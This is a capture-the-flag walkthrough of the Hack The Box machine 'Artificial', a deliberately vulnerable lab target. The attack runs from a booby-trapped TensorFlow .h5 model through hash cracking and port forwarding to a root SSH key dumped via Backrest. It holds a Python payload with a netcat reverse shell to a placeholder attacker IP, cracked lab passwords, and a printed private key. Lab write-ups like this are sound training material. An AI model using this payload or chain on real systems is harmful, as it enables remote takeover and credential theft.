---
tags:
  - HTB
  - Linux
  - Easy
  - File-Upload
  - Docker
  - RCE
  - Leakage
  - Brute-Force
  - Forwarding
---
https://app.hackthebox.com/machines/Artificial/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.10.11.74 artificial.htb
```
# Scanning
```console
$ nmap -p22,80 -sV -sC artificial.htb

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
|_  256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Artificial - AI Solutions
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Enumeration
The website allows you to build, test, and deploy AI models in the cloud.

After register and login, we can submit `.h5` files. In the website, we find a **Dockerfile** which setups the correct environment for AI development using Python.
# Exploitation
Clone a repository to craft malicious AI models with `.h5` file extension and deploy it inside the Docker environment:
```console
$ git clone https://github.com/Splinter0/tensorflow-rce

$ curl -s -O http://artificial.htb/static/Dockerfile

$ docker build -t ai_rce .

$ docker run -it --rm -v $(pwd)/tensorflow-rce:/code/repo ai_rce:latest
```
Now, we modify `exploit.py` file to contain a reverse shell:
```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```
Then, from **inside the container**, create the malicious `exploit.h5` model:
```console
$ cd /code/repo

$ python3 exploit.py

$ exit
```
Finally, wait for connections and upload the created `exploit.h5`:
```bash
nc -lvnp <PORT>
```
# Post-Exploitation
## User Migration
Found **user gael**:
```console
$ whoami
app

$ grep 'sh$' /etc/passwd
root:x:0:0:root:/root:/bin/bash
gael:x:1000:1000:gael:/home/gael:/bin/bash
app:x:1001:1001:,,,:/home/app:/bin/bash
```
Found **hashed password** for **gael** in the website database:
```console
$ sqlite3 /home/app/app/instance/users.db

sqlite> .tables
model  user

sqlite> select * from user where username='gael';
1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8

sqlite> .exit
```
Become **gael** after getting the **password** using [Crackstation](https://crackstation.net/): `mattp005numbertwo`
```console
$ su gael -
Password:

$ whoami
gael
```
Get the **user flag**:
```bash
cat /home/gael/user.txt
```
## Internal Service
Found internal open port 9898:
```console
$ ss -tulnp | awk '{print $5}'

Local
127.0.0.53%lo:53
127.0.0.53%lo:53
0.0.0.0:22
127.0.0.1:5000
127.0.0.1:9898
0.0.0.0:80
[::]:22
[::]:80
```
Re-connect to the machine via SSH to forward that port:
```bash
ssh -L 9898:127.0.0.1:9898 gael@artificial.htb
```
If we access the web, we can see a [Backrest](https://github.com/garethgeorge/backrest/) backup software. We need to login to access it. So, we found its location in the system at `/opt/backrest`:
```console
$ find / -iname '*backrest*' 2>/dev/null | grep -v 'backrest.service'

/usr/local/bin/backrest
/opt/backrest
/opt/backrest/.config/backrest
/opt/backrest/backrest
/opt/backrest/processlogs/backrest.log
/var/backups/backrest_backup.tar.gz
```
We can not access the configuration file, but we have a readable backup:
```console
$ cat /opt/backrest/.config/backrest/config.json
cat: /opt/backrest/.config/backrest/config.json: Permission denied

$ ls -l /var/backups/backrest_backup.tar.gz
-rw-r----- 1 root sysadm 52357120 Mar  4 22:19 /var/backups/backrest_backup.tar.gz

$ id
uid=1000(gael) gid=1000(gael) groups=1000(gael),1007(sysadm)
```
So, read the configuration file from the backup:
```console
$ cd /tmp

$ tar -xf /var/backups/backrest_backup.tar.gz

$ cat /tmp/backrest/.config/backrest/config.json
{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
      }
    ]
  }
}
```
Decoded the **hashed password** and saved it in the attacker's machine as `root.hash`:
```console
$ base64 -d <<< "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"

$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO
```
In the attacker's machine, cracked the **password**:
```console
$ hashcat --quiet -a 0 -m 3200 root.hash /usr/share/dict/rockyou.txt

$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO:!@#$%^
```
Now, log in to the Backrest service with **user** `backrest_root` and **password** `!@#$%^`.
## Privilege Escalation
Create a repo from the Backrest web service inside the filesystem and now enter the `Run Command` functionality.

Create a backup for the `/root` directory:
```console
$ backup /root

command: /opt/backrest/restic backup /root -o sftp.args=-oBatchMode=yes
no parent snapshot found, will read all files
Files:          30 new,     0 changed,     0 unmodified
Dirs:           48 new,     0 changed,     0 unmodified
Added to the repository: 4.326 MiB (4.212 MiB stored)
processed 30 files, 4.299 MiB in 0:00
snapshot 59288f74 saved
```
Get the private SSH key and save its value in `id_rsa` file:
```console
$ dump 59288f74 /root/.ssh/id_rsa

command: /opt/backrest/restic dump 59288f74 /root/.ssh/id_rsa -o sftp.args=-oBatchMode=yes
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```
Connect to the machine as **root**:
```bash
ssh -i id_rsa root@artificial.htb
```
Get the **root flag**:
```bash
cat /root/root.txt